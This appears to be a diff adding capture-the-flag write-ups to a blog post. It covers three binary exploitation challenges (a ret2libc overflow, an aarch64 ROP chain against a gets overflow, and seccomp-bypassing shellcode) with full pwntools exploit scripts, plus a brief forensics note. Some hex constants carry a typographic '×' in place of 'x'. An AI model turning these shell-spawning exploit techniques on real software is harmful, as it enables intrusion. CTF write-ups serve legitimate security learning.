@@ -9,7 +9,287 @@ useRelativeCover: true
 categories: [Capture The Flag]
 ---
 
+## Pwn
+
+### Poj
+
+NX and pie are enabled
+
+```bash
+checksec poj 
+[*] '/home/plaintext/Downloads/ctf/poj/poj'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b'./'
+```
+
+Decompiling with ghidra we get this function that prints the address of `write` and calls `FUN_0010115c`
+
+```c
+void FUN_0010117d(void)
+
+{
+  write(1,"Africa battle CTF 2024\n",0x17);
+  printf("Write() address : %p\n",write);
+  FUN_0010115c();
+  return;
+}
+```
+
+`read` gets `0x100` into `64` buffer which is `0x48` from the return address.
+
+```c
+void FUN_0010115c(void)
+
+{
+  undefined local_48 [64];
+  
+  read(0,local_48,0x100);
+  return;
+}
+```
+
+The offset is `72`. we extract `write` to calculate libc base. find `system` , `puts` and `/bin/sh`. finally build a rop chain to spawn shell using ret2libc.
+
+```python
+from pwn import *
+import re
+context.update(arch="amd64",os="linux")
+
+filename = './poj'
+libc=ELF("./libc.so.6")
+e = elf = ELF(filename)
+
+target=remote("challenge.bugpwn.com",1003)
+
+offset=72
+
+target.recv()
+banner=target.recv()
+write_addr=re.findall(b'0x[a-f0-9]{0,12}',banner)[0]
+write_addr=(int(write_addr,0))
+
+print(f"Write address: {hex(write_addr)}")
+
+libc.address=write_addr - libc.symbols['write']
+system=libc.symbols['system']
+puts=libc.symbols['puts']
+exit_fn=libc.symbols['exit']
+shell=next(libc.search(b'/bin/sh\x00'))
+pop_rdi=libc.address + 0×0000000000028215
+
+print("Libc_addr base address : " + str(hex(libc.address)))
+print("system address: " + str(hex(system)))
+print("puts address : " + str(hex(puts)))
+print("exit_fn address : " + str(hex(exit_fn)))
+print("shell address : " + str(hex(shell)))
+print("pop_rdi address: " + str(hex(pop_rdi)))
+rop=b""
+rop+=p64(pop_rdi)
+rop+=p64(shell)
+rop+=p64(puts)
+rop+=p64(pop_rdi)
+rop+=p64(shell)
+rop+=p64(system)
+payload=b"A" * offset + rop
+target.sendline(payload)
+target.interactive()
+```
+
+### Kami
+We first patch the binary
+
+```bash
+patchelf kami --set-interpreter ./ld-linux-aarch64.so.1 --set-rpath "./" ka
+```
+
+No pie and no stack canary
+
+```bash
+checksec kami 
+[*] '/home/plaintext/Downloads/kami/kami'
+    Arch:       aarch64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x3e0000)
+    RUNPATH:    b'./'
+    Stripped:   No
+```
+
+Decompiling with ghidra `fflush` address is leaked and another function kami is called
+
+```c
+undefined8 main(void)
+
+{
+  int iVar1;
+  
+  iVar1 = printf("fflush at %p\n",fflush);
+  kami(iVar1);
+  return 0;
+}
+```
+
+Kami uses a dangerous function `gets` which can be used for buffer overflow 
+
+```c
+
+/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
+
+void kami(void)
+
+{
+  char acStack_80 [128];
+  
+  printf("Welcome to Africa battleCTF.!");
+  fflush(_stdout);
+  gets(acStack_80);
+  return;
+}
+```
+
+The offset is `136` . So we need to extract the leaked address of `fflush` , find the address of `system`, `/bin/sh` and `puts` and lastly the gadgets to call `system(/bin/sh)`.
+
+Using ropper we get these two gadgets to use
+
+```bash
+0x0000000000027b38: ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
+0x0000000000049620: mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
+```
+
+We then build the exploit
+
+```python
+from pwn import *
+import re
+
+filename = './patched'
+libc=ELF("./libc.so.6")
+
+target=remote("challenge.bugpwn.com",1000)
+
+leak=target.recv()
+fflush_leak = int(re.findall(b'0x[a-f0-9]+',leak)[0].decode(),0)
+print(f"fflush address {hex(fflush_leak)}")
+
+libc.address = fflush_leak - 0×00000000006b590 # 0×55008bad1a
+system=libc.address +0×000000000049480
+puts=libc.address +0×00000000006da70
+exit=libc.address +0×00000000003c760
+shell=next(libc.search(b'/bin/sh\x00'))
+
+print(f"libc base address {hex(libc.address)}")
+print(f"puts address {hex(puts)}")
+print(f"shell address {hex(shell)}")
+print(f"exit address {hex(exit)}")
+print(f"system address {hex(system)}")
+
+payload = b''
+payload += 128 * b'A'
+payload += 8 * b'B'
+payload += p64(libc.address + 0×0000000000027b38) 
+payload += (8 * 3) * b'C'
+payload += p64(libc.address + 0×0000000000049620)
+payload += p64(shell)
+payload += (8 * 2) * b'D'
+payload += p64(libc.sym.system)
+target.sendline(payload)
+target.interactive()
+```
+
+### Universe
+
+Decompiling the binary we find this function `FUN_001012b3`. a mapped reagion is created with `mmap` and marked as `rwx`. it calls a function `FUN_00101208()` and get user input and stores it in the mapped region and executes it.
+
+```bash
+
+undefined8 FUN_001012b3(void)
+
+{
+  code *pcVar1;
+  ssize_t sVar2;
+  int local_c;
+  
+  local_c = 0;
+  pcVar1 = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
+  puts("Africa battleCTF 2024");
+  puts(
+      "By its very subject, cosmology flirts with metaphysics. Because how can we study an object fr om which we cannot extract ourselves? Einstein had this audacity and the Universe once again b ecame an object of science. Without losing its philosophical dimension.\nWhat do you think of the universe?"
+      );
+  fflush(stdout);
+  FUN_00101208();
+  for (; local_c != 0x1000; local_c = local_c + (int)sVar2) {
+    sVar2 = read(0,pcVar1 + local_c,(long)(0x1000 - local_c));
+  }
+  (*pcVar1)();
+  return 0;
+}
+```
+
+The function setups seccomp rules to limit syscalls 
+
+```c
+
+void FUN_00101208(void)
+
+{
+  DAT_00104078 = seccomp_init(0x7fff0000);
+  if (DAT_00104078 == 0) {
+    seccomp_reset(0,0x7fff0000);
+                    /* WARNING: Subroutine does not return */
+    _exit(-1);
+  }
+  seccomp_arch_add(DAT_00104078,0xc000003e);
+  FUN_001011c9(2);
+  FUN_001011c9(0x38);
+  FUN_001011c9(0x39);
+  FUN_001011c9(0x3a);
+  FUN_001011c9(0x3b);
+  FUN_001011c9(0x55);
+  FUN_001011c9(0x142);
+  seccomp_load(DAT_00104078);
+  return;
+}
+```
+
+using seccomp-tools we find the following syscalls are restricted
+
+```bash
+open,clone,fork,vfork,execve,creat,execveat
+```
+
+To bypass the checks we use `openat` and `sendfile`.
+
+```python
+from pwn import *
+
+context.update(arch="amd64",os="linux")
+filename = './universe'
+e = elf = ELF(filename)
+
+target=remote("challenge.bugpwn.com",1004)
+
+target.recvuntil(b'What do you think of the universe?\n')
+shellcode = shellcraft.openat(-100, "/flag.txt",0)
+shellcode += shellcraft.sendfile(1, 3, 0×0, 4000)
+shellcode=asm(shellcode)
+payload=shellcode + b'\x00' * (0×1000-len(shellcode))
+
+for i in range(0×1000):
+  target.send(chr(payload[i]))
+target.interactive()
+```
+
 ## Forensics
+
+### Do(ro X2 )
+
+Using FTK Imager we use the provided password and we get the flag at `C:\\Users\\Desktop\\Delano\\Documents\\Image`
+
 ### Symphony
 
 > Analyze the file. Extensive manipulation is required to uncover what’s hidden within.
